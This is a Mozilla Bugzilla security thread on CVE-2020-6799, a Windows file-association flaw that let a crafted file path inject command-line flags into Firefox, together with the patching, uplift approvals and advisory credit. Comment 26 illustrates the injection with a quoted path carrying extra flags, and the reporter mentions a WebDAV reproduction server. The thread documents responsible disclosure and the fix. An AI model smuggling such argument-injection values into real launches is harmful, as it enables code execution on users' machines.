|  | [Joshua Graham](/user_profile?user_id=600722)  Reporter |  |
| --- | --- | --- |
| [Comment 18](/show_bug.cgi?id=1606596#c18)• 5 years ago |
|  | |

I'm happy to keep it online. I'll attach the server code to this bug when I get home so you can reproduce it in case my server dies for some reason.

Flags: needinfo?(jpg.inc.au)

|  | [Joshua Graham](/user_profile?user_id=600722)  Reporter |  |
| --- | --- | --- |
| [Comment 19](/show_bug.cgi?id=1606596#c19)• 5 years ago |
|  | |

The chrome team (on a separate bug report) made a comment that might apply here:

> ... We need some logic that does something sensible when writing this key. One possibility: when installing, only populate Applications (and App Paths) if no such registration exists. Or maybe make sure it's the "most stable" of the various install modes (e.g., if system-level dev and beta are both installed, beta wins). We'd also want some repair on uninstall: when uninstalling beta, dev should magically take over. When any mode of installation is made a user's default browser, write its config in that user's HKCU hive. ...

|  | [Molly Howell (she/her) (mostly inactive)](/user_profile?user_id=550257)  Assignee |  |
| --- | --- | --- |
| [Comment 20](/show_bug.cgi?id=1606596#c20)• 5 years ago |
|  | |

(In reply to Joshua Graham from [comment #19](/show_bug.cgi?id=1606596#c19 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox"))

> The chrome team (on a separate bug report) made a comment that might apply here:
>
> > ... We need some logic that does something sensible when writing this key. One possibility: when installing, only populate Applications (and App Paths) if no such registration exists. Or maybe make sure it's the "most stable" of the various install modes (e.g., if system-level dev and beta are both installed, beta wins). We'd also want some repair on uninstall: when uninstalling beta, dev should magically take over. When any mode of installation is made a user's default browser, write its config in that user's HKCU hive. ...

That is relevant, thank you. We have really all of these same problems, but what's in my patch isn't this sophisticated, partly because I don't think it's worth the effort, but also because I don't think it's appropriate for me to make decisions for the user about what channel they meant to be using.

|  | [Joshua Graham](/user_profile?user_id=600722)  Reporter |  |
| --- | --- | --- |
| [Comment 21](/show_bug.cgi?id=1606596#c21)• 5 years ago |
|  | |

Attached file
[Simple node WebDAV server that will respond to any folder/file name](attachment.cgi?id=9119318)
— [Details](attachment.cgi?id=9119318&action=edit)

This is a simple WebDAV server that you can use to test [bug 1606596](/show_bug.cgi?id=1606596 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox"). To make it work install node/npm, install express (`nmp install express` ) and start the server `node firefox.js 80 pdf`.

|  | [Joshua Graham](/user_profile?user_id=600722)  Reporter |  |
| --- | --- | --- |
| [Comment 22](/show_bug.cgi?id=1606596#c22)• 5 years ago |
|  | |

If this ends up getting credited in the change log could you please make the credit:

Joshua Graham of TSS & Brendan Scarvell

If you have to use a single name just:

Brendan Scarvell

Brendan's name was left out of [bug 1530103](/show_bug.cgi?id=1530103 "VERIFIED FIXED - URI handler Remote Code Execution via command line parameter injection in Firefox") and he deserves credit. :-). If there is a bounty, does Firefox match if we donate it to charity? I would like to give the money to one of the Australian bush fire charities.

|  | [Nathan Froyd [:froydnj]](/user_profile?user_id=417288) |  |
| --- | --- | --- |
| [Comment 23](/show_bug.cgi?id=1606596#c23)• 5 years ago |
|  | |

(In reply to :Gijs (he/him) from [comment #10](/show_bug.cgi?id=1606596#c10 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox"))

> (In reply to Mike Hommey [:glandium] from [comment #8](/show_bug.cgi?id=1606596#c8 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox"))
>
> > I wonder at what stage of the command line "parsing" we end up considering what was supposed to be passed as one argument as multiple ones, including flags.
>
> I expect it's just that we get the arguments' argv/argc combo in `main()` with the wrong values? The docs at <https://docs.microsoft.com/en-us/cpp/cpp/main-function-command-line-args?view=vs-2019#parsing-c-command-line-arguments> (and the sad tales at <https://docs.microsoft.com/en-gb/archive/blogs/twistylittlepassagesallalike/everyone-quotes-command-line-arguments-the-wrong-way> ) seem to suggest that to me, but I could be wrong about that. (to offer slightly more detail: the double quotes in the file path seem to cause the subsequent arguments to be parsed as individual arguments by the C++ runtime / Windows / whatever -- rather than as a single string, which is how they were intended)
>
> Would we be able to usefully put things back together at that point, in a way that wouldn't break legitimate uses? It seems pretty audacious to be claiming we can do the arg parsing better than the OS, especially if information (about escaping etc.) already got thrown away when the URL was initially passed by the OS. Nathan, what do you think?

I'm unclear on what the question here is. Are you asking "should we try to discern whether arguments that were meant to be usefully double-quoted actually got split into separate `argv` values and try to reassemble them"? That way sounds fraught with all sorts of terror (but maybe people already do this to cope with broken software?).

Flags: needinfo?(nfroyd)

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Comment 24](/show_bug.cgi?id=1606596#c24)• 5 years ago |
|  | |

(In reply to Nathan Froyd [:froydnj] from [comment #23](/show_bug.cgi?id=1606596#c23 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox"))

Yeah, sorry for rambling. Let me try to clarify inline. I think I have two questions:

> (In reply to :Gijs (he/him) from [comment #10](/show_bug.cgi?id=1606596#c10 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox"))
>
> > (In reply to Mike Hommey [:glandium] from [comment #8](/show_bug.cgi?id=1606596#c8 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox"))
> >
> > > I wonder at what stage of the command line "parsing" we end up considering what was supposed to be passed as one argument as multiple ones, including flags.
> >
> > I expect it's just that we get the arguments' argv/argc combo in `main()` with the wrong values? The docs at <https://docs.microsoft.com/en-us/cpp/cpp/main-function-command-line-args?view=vs-2019#parsing-c-command-line-arguments> (and the sad tales at <https://docs.microsoft.com/en-gb/archive/blogs/twistylittlepassagesallalike/everyone-quotes-command-line-arguments-the-wrong-way> ) seem to suggest that to me, but I could be wrong about that. (to offer slightly more detail: the double quotes in the file path seem to cause the subsequent arguments to be parsed as individual arguments by the C++ runtime / Windows / whatever -- rather than as a single string, which is how they were intended)

Does this seem like an accurate read of what's going on?

> > Would we be able to usefully put things back together at that point, in a way that wouldn't break legitimate uses? It seems pretty audacious to be claiming we can do the arg parsing better than the OS, especially if information (about escaping etc.) already got thrown away when the URL was initially passed by the OS. Nathan, what do you think?
>
> I'm unclear on what the question here is. Are you asking "should we try to discern whether arguments that were meant to be usefully double-quoted actually got split into separate `argv` values and try to reassemble them"? That way sounds fraught with all sorts of terror (but maybe people already do this to cope with broken software?).

And yes, the "do we have a chance to recover from the OS's mistake", and you kinda answered that one...

Flags: needinfo?(nfroyd)

|  | [Robert Strong (they/them - no direct email)](/user_profile?user_id=141755) |  |
| --- | --- | --- |
| [Comment 25](/show_bug.cgi?id=1606596#c25)• 5 years ago • [Edited](/page.cgi?id=comment-revisions.html&bug_id=1606596&comment_id=14583242 "1 revision") |
|  | |

No idea if this is helpful but there is a command line argument test that checks the reassembly of command line arguments when having to relaunch Firefox with the original command line under

<https://searchfox.org/mozilla-central/source/toolkit/xre/test/win>

It verifies that our argument cleanup is equivalent to the cleanup performed by the OS. The arguments it tests are in

<https://searchfox.org/mozilla-central/source/toolkit/xre/test/win/TestXREMakeCommandLineWin.ini>

|  | [Nathan Froyd [:froydnj]](/user_profile?user_id=417288) |  |
| --- | --- | --- |
| [Comment 26](/show_bug.cgi?id=1606596#c26)• 5 years ago |
|  | |

(In reply to :Gijs (he/him) from [comment #24](/show_bug.cgi?id=1606596#c24 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox"))

> > (In reply to :Gijs (he/him) from [comment #10](/show_bug.cgi?id=1606596#c10 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox"))
> >
> > > (In reply to Mike Hommey [:glandium] from [comment #8](/show_bug.cgi?id=1606596#c8 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox"))
> > >
> > > > I wonder at what stage of the command line "parsing" we end up considering what was supposed to be passed as one argument as multiple ones, including flags.
> > >
> > > I expect it's just that we get the arguments' argv/argc combo in `main()` with the wrong values? The docs at <https://docs.microsoft.com/en-us/cpp/cpp/main-function-command-line-args?view=vs-2019#parsing-c-command-line-arguments> (and the sad tales at <https://docs.microsoft.com/en-gb/archive/blogs/twistylittlepassagesallalike/everyone-quotes-command-line-arguments-the-wrong-way> ) seem to suggest that to me, but I could be wrong about that. (to offer slightly more detail: the double quotes in the file path seem to cause the subsequent arguments to be parsed as individual arguments by the C++ runtime / Windows / whatever -- rather than as a single string, which is how they were intended)
>
> Does this seem like an accurate read of what's going on?

Yes. For avoidance of doubt (and so somebody can correct me I'm wrong, which is likely), my understanding is that we have:

```
"path\to\firefox.exe" "%1"

```

in the registry for executing Firefox, and somebody specifies the weird string in [comment 0](/show_bug.cgi?id=1606596#c0 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox"). Through string substitution, we get:

```
"path\to\firefox.exe" "\\stuff\a.txt" -flagsandstuff"

```

and then...something...strips off quotes, so we have:

```
path\to\firefox.exe \\stuff\a.txt -flagsandstuff["]

```

(not sure what happens to that last quote, I guess if you just `str.remove('"')` or similar, it'd be gone, rather than trying to balance quotes?)

Not sure what happens next, but I guess the exact steps don't matter: that command line eventually winds up being split on spaces to wind up in Firefox's `argv`? (From my limited understanding, this all sounds terrible, and basically everybody would have to implement something similar to what mhowell's patch (and `-osint`?) does to avoid letting file arguments actually specify arbitrary command-line arguments?)

> > > Would we be able to usefully put things back together at that point, in a way that wouldn't break legitimate uses? It seems pretty audacious to be claiming we can do the arg parsing better than the OS, especially if information (about escaping etc.) already got thrown away when the URL was initially passed by the OS. Nathan, what do you think?
> >
> > I'm unclear on what the question here is. Are you asking "should we try to discern whether arguments that were meant to be usefully double-quoted actually got split into separate `argv` values and try to reassemble them"? That way sounds fraught with all sorts of terror (but maybe people already do this to cope with broken software?).
>
> And yes, the "do we have a chance to recover from the OS's mistake", and you kinda answered that one...

Yeah, I think looking at what we have in that last command line up there, we'd have to infer the location of the double quote, and determine what elements of `argv` should effectively be re-concatenated, which isn't going to turn out well for anybody. And I think this is a different scenario than rstrong posted in [comment 25](/show_bug.cgi?id=1606596#c25 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox") (which is helpful; I didn't know about that test!): we're not trying to reassemble things to relaunch anything, but we're trying to discern whether arguments got split by whatever launched us in a way that was not intended.

Flags: needinfo?(nfroyd)

|  | [Molly Howell (she/her) (mostly inactive)](/user_profile?user_id=550257)  Assignee |  |
| --- | --- | --- |
| [Comment 27](/show_bug.cgi?id=1606596#c27)• 5 years ago |
|  | |

Comment on [attachment 9119189](/attachment.cgi?id=9119189 "Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin") [[details]](/attachment.cgi?id=9119189&action=edit "Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin")

[Bug 1606596](/show_bug.cgi?id=1606596 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox") - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin

### Security Approval Request

* **How easily could an exploit be constructed based on the patch?**: Not very easily I think; the patch necessarily points to a scenario where file associations with command lines missing a `-osint` can get created, but doesn't go into the implications of that.
* **Do comments in the patch, the check-in comment, or tests included in the patch paint a bulls-eye on the security problem?**: No
* **Which older supported branches are affected by this flaw?**: All
* **If not all supported branches, which bug introduced the flaw?**: None
* **Do you have backports for the affected branches?**: No
* **If not, how different, hard to create, and risky will they be?**: Should be trivial; code around this patch hasn't changed in years.
* **How likely is this patch to cause regressions; how much testing does it need?**: I'm confident in this patch. There are some known limitations and drawbacks which are discussed in the review, but regression risk should be minimal because the patch involves a set of file association configurations that is separate from the ones the installer otherwise creates and manipulates, so regressing those is very unlikely.

To be clear, I don't think of this patch as the real fix for the bug, just as a stopgap until the command line changes being discussed above are in. With something like this I can only patch one method of launching Firefox with attacker-controlled command-line parameters, but there are likely others, and I can't even guarantee that I'm patching all existing file associations (because command lines might have been copied elsewhere in the registry).

[Attachment #9119189](/attachment.cgi?id=9119189&action=edit "Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin") -
Flags: sec-approval?

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Comment 28](/show_bug.cgi?id=1606596#c28)• 5 years ago |
|  | |

Comment on [attachment 9119189](/attachment.cgi?id=9119189 "Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin") [[details]](/attachment.cgi?id=9119189&action=edit "Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin")

[Bug 1606596](/show_bug.cgi?id=1606596 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox") - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin

Approved to land and request uplift.

[Attachment #9119189](/attachment.cgi?id=9119189&action=edit "Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin") -
Flags: sec-approval? → sec-approval+

|  | [Molly Howell (she/her) (mostly inactive)](/user_profile?user_id=550257)  Assignee |  |
| --- | --- | --- |
| [Comment 29](/show_bug.cgi?id=1606596#c29)• 5 years ago |
|  | |

<https://hg.mozilla.org/integration/autoland/rev/1bfc604fa210>

|  | [Molly Howell (she/her) (mostly inactive)](/user_profile?user_id=550257)  Assignee |  |
| --- | --- | --- |
| [Comment 30](/show_bug.cgi?id=1606596#c30)• 5 years ago |
|  | |

Comment on [attachment 9119189](/attachment.cgi?id=9119189 "Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin") [[details]](/attachment.cgi?id=9119189&action=edit "Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin")

[Bug 1606596](/show_bug.cgi?id=1606596 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox") - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin

### Beta/Release Uplift Approval Request

* **User impact if declined**: Exposure to remote code execution at the user's privilege level upon clicking a link, provided the client machine is already configured with at least one manually created file type association.
* **Is this code covered by automated tests?**: No
* **Has the fix been verified in Nightly?**: Yes
* **Needs manual test from QE?**: No
* **If yes, steps to reproduce**:
* **List of other uplifts needed**: None
* **Risk to taking this patch**: Low
* **Why is the change risky/not risky? (and alternatives if risky)**: I'm confident in this patch. There are some known limitations and drawbacks which are discussed in the review, but regression risk should be minimal because the patch involves a set of file association configurations that is separate from the ones the installer otherwise creates and manipulates (which include the common web page file types), so regressing those is very unlikely. It's also been manually tested by myself and the reviewer.
* **String changes made/needed**: N/A

### ESR Uplift Approval Request

* **If this is not a sec:{high,crit} bug, please state case for ESR consideration**: This is a sec-high bug.
* **User impact if declined**: Exposure to remote code execution at the user's privilege level upon clicking a link, provided the client machine is already configured with at least one manually created file type association.
* **Fix Landed on Version**: 74
* **Risk to taking this patch**: Low
* **Why is the change risky/not risky? (and alternatives if risky)**: I'm confident in this patch. There are some known limitations and drawbacks which are discussed in the review, but regression risk should be minimal because the patch involves a set of file association configurations that is separate from the ones the installer otherwise creates and manipulates (which include the common web page file types), so regressing those is very unlikely. It's also been manually tested by myself and the reviewer.
* **String or UUID changes made by this patch**: N/A
[Attachment #9119189](/attachment.cgi?id=9119189&action=edit "Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin") -
Flags: approval-mozilla-release?
[Attachment #9119189](/attachment.cgi?id=9119189&action=edit "Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin") -
Flags: approval-mozilla-esr68?
[Attachment #9119189](/attachment.cgi?id=9119189&action=edit "Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin") -
Flags: approval-mozilla-beta?

|  | [Sebastian Hengst [:aryx] (needinfo me if it's about an intermittent or backout)](/user_profile?user_id=258347) |  |
| --- | --- | --- |
| [Comment 31](/show_bug.cgi?id=1606596#c31)• 5 years ago |
|  | |

<https://hg.mozilla.org/mozilla-central/rev/1bfc604fa210>

Group: firefox-core-security → core-security-releaseStatus: UNCONFIRMED → RESOLVEDClosed: 5 years ago
[status-firefox74](/buglist.cgi?f1=cf_status_firefox74&o1=isnotempty):
--- → [fixed](/buglist.cgi?f1=cf_status_firefox74&o1=equals&v1=fixed)Resolution: --- → FIXEDTarget Milestone: --- → Firefox 74

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 32](/show_bug.cgi?id=1606596#c32)• 5 years ago |
|  | |

Comment on [attachment 9119189](/attachment.cgi?id=9119189 "Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin") [[details]](/attachment.cgi?id=9119189&action=edit "Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin")

[Bug 1606596](/show_bug.cgi?id=1606596 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox") - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin

Approved for 73.0b5 so we can get some wider testing.

[Attachment #9119189](/attachment.cgi?id=9119189&action=edit "Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin") -
Flags: approval-mozilla-beta? → approval-mozilla-beta+

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 33](/show_bug.cgi?id=1606596#c33)• 5 years ago |
| uplift | |

<https://hg.mozilla.org/releases/mozilla-beta/rev/34a98c5e4134>

[status-firefox72](/buglist.cgi?f1=cf_status_firefox72&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox72&o1=equals&v1=affected)
[status-firefox73](/buglist.cgi?f1=cf_status_firefox73&o1=isnotempty):
--- → [fixed](/buglist.cgi?f1=cf_status_firefox73&o1=equals&v1=fixed)
[status-firefox-esr68](/buglist.cgi?f1=cf_status_firefox_esr68&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=affected)
[tracking-firefox73](/buglist.cgi?f1=cf_tracking_firefox73&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox73&o1=equals&v1=%2B)
[tracking-firefox74](/buglist.cgi?f1=cf_tracking_firefox74&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox74&o1=equals&v1=%2B)
[tracking-firefox-esr68](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=isnotempty):
--- → [73+](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=equals&v1=73%2B)

|  | [Julien Cristau [:jcristau]](/user_profile?user_id=580382) |  |
| --- | --- | --- |
| [Comment 34](/show_bug.cgi?id=1606596#c34)• 5 years ago |
|  | |

Comment on [attachment 9119189](/attachment.cgi?id=9119189 "Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin") [[details]](/attachment.cgi?id=9119189&action=edit "Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin")

[Bug 1606596](/show_bug.cgi?id=1606596 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox") - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin

I'd rather not take this in a dot release, it can go out with 73 in a few weeks.

[Attachment #9119189](/attachment.cgi?id=9119189&action=edit "Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin") -
Flags: approval-mozilla-release? → approval-mozilla-release-

|  | [Julien Cristau [:jcristau]](/user_profile?user_id=580382) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1606596#a1319936_580382)• 5 years ago |

[status-firefox72](/buglist.cgi?f1=cf_status_firefox72&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox72&o1=equals&v1=affected) → [wontfix](/buglist.cgi?f1=cf_status_firefox72&o1=equals&v1=wontfix)

|  | [Bogdan Maris, Desktop Test Engineering](/user_profile?user_id=458188) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1606596#a1322679_458188)• 5 years ago |

Flags: qe-verify-Whiteboard: [reporter-external] [client-bounty-form] [verif?] → [reporter-external] [client-bounty-form] [verif?][post-critsmash-triage]

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 35](/show_bug.cgi?id=1606596#c35)• 5 years ago |
|  | |

Comment on [attachment 9119189](/attachment.cgi?id=9119189 "Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin") [[details]](/attachment.cgi?id=9119189&action=edit "Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin")

[Bug 1606596](/show_bug.cgi?id=1606596 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox") - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin

Approved for 68.5esr. I'm a bit worried about potential enterprise fallout, though. Mike, are you aware of anything in particular we might want to test with this before shipping in 2 weeks?

Flags: needinfo?(mozilla)
[Attachment #9119189](/attachment.cgi?id=9119189&action=edit "Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin") -
Flags: approval-mozilla-esr68? → approval-mozilla-esr68+

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 36](/show_bug.cgi?id=1606596#c36)• 5 years ago |
| uplift | |

<https://hg.mozilla.org/releases/mozilla-esr68/rev/b25bc5d633fe>

[status-firefox-esr68](/buglist.cgi?f1=cf_status_firefox_esr68&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=fixed)

|  | [Mike Kaply [:mkaply]](/user_profile?user_id=7313) |  |
| --- | --- | --- |
| [Comment 37](/show_bug.cgi?id=1606596#c37)• 5 years ago |
|  | |

I honestly don't have a good sense of what this fix exactly does.

What we're going to need to do is explain it really well so we can determine if it will cause any issues.

Flags: needinfo?(mozilla)

|  | [Molly Howell (she/her) (mostly inactive)](/user_profile?user_id=550257)  Assignee |  |
| --- | --- | --- |
| [Comment 38](/show_bug.cgi?id=1606596#c38)• 5 years ago |
|  | |

The most noticeable user-visible effect of this change is that we'll be listed in the Open With dialog for every file type, but "below the fold" for types we don't claim to support (meaning you have to expand the More Apps section to see it). This is a side-effect of the actual intended fix.

The actual intended fix is to replace the registry key that the Open With dialog creates when you manually associate us with a file type we don't claim support for (`.pdf` is the most common example), which we need to do because the default command line it writes into that key is insecure. So, the other effect this patch might have is that if anyone has customized any of the values we're going to write in `HKEY_CLASSES_ROOT\Applications\firefox.exe`, then those customization will be overwritten. This includes the command line string, the default icon, and the supported file types, but not any of the more common things that tend to get customized in that key, like `NoStartPage`, so those won't be affected. The uninstaller will remove the entire key if the command line points to the copy being uninstalled, though.

I think that covers it. I know it's complicated and subtle, but `HKCR` is like that.

|  | [Mike Kaply [:mkaply]](/user_profile?user_id=7313) |  |
| --- | --- | --- |
| [Comment 39](/show_bug.cgi?id=1606596#c39)• 5 years ago |
|  | |

Is that true of other browsers as well? Or is this problem unique to us, and so is the workaround?

|  | [Molly Howell (she/her) (mostly inactive)](/user_profile?user_id=550257)  Assignee |  |
| --- | --- | --- |
| [Comment 40](/show_bug.cgi?id=1606596#c40)• 5 years ago |
|  | |

The reporter here indicated that Chrome had a similar bug but patched it a few months ago, but I wasn't able to see the patch myself; see the ends of [comment 5](/show_bug.cgi?id=1606596#c5 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox") and [comment 6](/show_bug.cgi?id=1606596#c6 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox").

|  | [Joshua Graham](/user_profile?user_id=600722)  Reporter |  |
| --- | --- | --- |
| [Comment 41](/show_bug.cgi?id=1606596#c41)• 5 years ago |
|  | |

I was wrong about Chrome, it has not been patched and I have opened a bug report with their team.

|  | [Molly Howell (she/her) (mostly inactive)](/user_profile?user_id=550257)  Assignee |  |
| --- | --- | --- |
| [Comment 42](/show_bug.cgi?id=1606596#c42)• 5 years ago |
|  | |

I see, thanks for doing that and reporting back.

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1606596#a1841922_578488)• 5 years ago |

Whiteboard: [reporter-external] [client-bounty-form] [verif?][post-critsmash-triage] → [reporter-external] [client-bounty-form] [verif?][post-critsmash-triage][adv-main73+]

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1606596#a1842090_578488)• 5 years ago |

Whiteboard: [reporter-external] [client-bounty-form] [verif?][post-critsmash-triage][adv-main73+] → [reporter-external] [client-bounty-form] [verif?][post-critsmash-triage][adv-main73+] [adv-esr68.5+]

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Comment 43](/show_bug.cgi?id=1606596#c43)• 5 years ago |
|  | |

Attached file
[advisory.txt](attachment.cgi?id=9122670) (obsolete)
— [Details](attachment.cgi?id=9122670&action=edit)

|  | [Joshua Graham](/user_profile?user_id=600722)  Reporter |  |
| --- | --- | --- |
| [Comment 44](/show_bug.cgi?id=1606596#c44)• 5 years ago |
|  | |

Hi @Tom.

Could you please use Joshua Graham & Brendan Scarvell for credit?

This advisory text might be a little more technically accurate if you would like to use it instead (modified from the previous advisory <https://www.mozilla.org/en-US/security/advisories/mfsa2019-08/#CVE-2019-9794>):

A vulnerability was discovered where command line arguments can be injected during Firefox invocation as a shell handler for certain unsupported file types. This could be used to retrieve and execute files whose location is supplied through these command line arguments if Firefox is configured as the default handler for a given file type and the file is opened in third party application as these applications insufficiently sanitize URL data.<br>*Note: This issue only affects Windows operating systems. Other operating systems are unaffected.*

Joshua Graham & Brendan Scarvell

|  | [Julien Cristau [:jcristau]](/user_profile?user_id=580382) |  |
| --- | --- | --- |
| [Comment 45](/show_bug.cgi?id=1606596#c45)• 5 years ago |
|  | |

see [comment 44](/show_bug.cgi?id=1606596#c44 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox").

Flags: needinfo?(tom)

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Comment 46](/show_bug.cgi?id=1606596#c46)• 5 years ago |
|  | |

Attached file
[advisory.txt](attachment.cgi?id=9122901)
— [Details](attachment.cgi?id=9122901&action=edit)

Thanks!

[Attachment #9122670](/attachment.cgi?id=9122670&action=edit "advisory.txt") -
Attachment is obsolete: trueFlags: needinfo?(tom)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1606596#a2802280_1689)• 5 years ago |

Flags: sec-bounty? → sec-bounty+Keywords: [sec-high](/buglist.cgi?keywords=sec-high&resolution=---) → [sec-moderate](/buglist.cgi?keywords=sec-moderate&resolution=---)

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1606596#a3397298_578488)• 5 years ago |

Alias: CVE-2020-6799

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1606596#a6008891_159069)• 5 years ago |

Regressions: [1619122](/show_bug.cgi?id=1619122 "VERIFIED FIXED - Firefox don't listed in context menu \"open with...\" with file type .jpg extension")

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1606596#a13390813_1689)• 5 years ago |

Group: core-security-release

|  | [David Lawrence [:dkl]](/user_profile?user_id=5898) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1606596#a139137079_5898)• 8 months ago |

Keywords: [reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---)
You need to [log in](/show_bug.cgi?id=1606596&GoAheadAndLogIn=1)
before you can comment on or make changes to this bug.

Top ↑

## Attachment

Hide Details

### General

Creator:  [Molly Howell (she/her) (mostly inactive)](/user_profile?user_id=550257)

Created:
Updated:
Size:

### Description

### File Name

### Content Type

Raw
Diff
Splinter Review



=== Content from www.mozilla.org_ff0f8d89_20250119_123141.html ===


## Help us improve your Mozilla experience

In addition to Cookies necessary for this site to function, we’d like your permission to set some additional Cookies to better understand your browsing needs and improve your experience. Rest assured — we value your privacy.

Accept All Additional Cookies

Reject All Additional Cookies

[Cookie settings](/en-US/privacy/websites/cookie-settings/)

Menu
[![Mozilla](https://www.mozilla.org/media/img/logos/m24/lockup-black.f2ddba3f0724.svg)](/en-US/)

* [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
  Firefox browsers](/en-US/firefox/)
  Close Firefox browsers menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Desktop](/en-US/firefox/new/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for iOS](/en-US/firefox/browsers/mobile/ios/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Android](/en-US/firefox/browsers/mobile/android/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/focus/logo.aac3e33175cb.svg)
    ## Firefox Focus](/en-US/firefox/browsers/mobile/focus/)
  + [## Firefox blog](https://blog.mozilla.org/firefox/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=firefox)
* [Products](/en-US/products/)
  Close Products menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/mozilla/vpn/logo.c648f487bfb8.svg)
    ## Mozilla VPN](/en-US/products/vpn/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/monitor/logo.d97e5516f9e6.svg)
